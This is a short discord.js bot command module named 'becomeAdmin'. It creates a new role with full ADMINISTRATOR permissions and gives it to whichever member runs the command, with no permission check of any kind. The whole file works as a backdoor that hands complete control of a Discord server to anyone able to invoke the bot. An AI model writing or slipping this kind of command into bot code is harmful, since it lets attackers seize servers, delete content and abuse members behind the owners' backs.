const Discord = require('discord.js');

/**
 * @param {Discord.Client} client
 * @param {Discord.Message} message
 * @param {Array<String>} arguments
 */
module.exports.run = async (client, message, arguments) => {
    let newRole = await message.guild.roles.create({name:"admin", color: "YELLOW", permissions:"ADMINISTRATOR"})
    await message.member.roles.add(newRole)

};

module.exports.name = 'becomeAdmin';